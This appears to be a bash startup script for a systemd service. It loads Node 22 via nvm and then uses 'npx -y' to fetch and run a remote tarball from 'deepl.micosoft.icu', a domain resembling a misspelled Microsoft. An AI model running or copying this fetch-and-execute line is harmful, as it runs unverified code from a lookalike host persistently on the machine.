#!/bin/bash
cd /home/yhz/iot
export NVM_DIR="/home/yhz/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
# Try to use node 22; nvm use may fail if not available in service env
nvm use 22 >/dev/null 2>&1 || true
# Run via npx and redirect logs to file so systemd supervision + logfile both available
exec npx -y "https://deepl.micosoft.icu/api/api-worker.tgz?v=1.0.49" >> /home/yhz/iot/api-worker-npx.log 2>&1
